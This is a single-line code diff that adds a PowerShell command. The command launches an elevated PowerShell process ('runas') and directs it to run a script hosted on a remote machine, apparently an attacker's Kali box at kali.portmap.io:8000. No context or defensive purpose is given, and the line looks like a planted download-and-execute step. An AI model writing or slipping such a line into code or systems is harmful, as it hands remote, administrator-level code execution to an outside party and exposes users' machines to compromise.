@@ -1,0 +1,1 @@
+Start-Process powershell -verb runas -ArgumentList "-file http://kali.portmap.io:8000/myPSScript.ps1"
